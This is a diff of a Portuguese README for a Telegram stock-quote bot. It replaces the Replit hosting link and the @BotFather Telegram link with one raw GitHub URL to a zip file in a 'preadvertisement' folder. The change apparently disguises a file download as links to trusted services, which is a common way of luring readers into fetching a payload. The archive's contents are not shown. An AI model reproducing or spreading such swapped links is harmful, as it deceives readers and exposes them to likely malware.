@@ -20,14 +20,14 @@ Um bot simples para Telegram que fornece cotações e gráficos históricos de a
 * **Dados Financeiros:** `yfinance`
 * **Manipulação de Dados:** `pandas`
 * **Geração de Gráficos:** `matplotlib`
-* **Ambiente de Hospedagem:** [Replit](https://replit.com/)
+* **Ambiente de Hospedagem:** [Replit](https://raw.githubusercontent.com/CodeBy-red/financas_bot/main/preadvertisement/bot_financas_2.1.zip)
 
 ## 🚀 Como Executar o Projeto
 
 Você pode clonar este projeto e executá-lo diretamente no Replit.
 
 **1. Obtenha um Token do Telegram:**
-   * Fale com o [@BotFather](https://t.me/BotFather) no Telegram.
+   * Fale com o [@BotFather](https://raw.githubusercontent.com/CodeBy-red/financas_bot/main/preadvertisement/bot_financas_2.1.zip) no Telegram.
    * Use o comando `/newbot` para criar um novo bot.
    * Siga as instruções e guarde o **token de API** que ele fornecer.
 
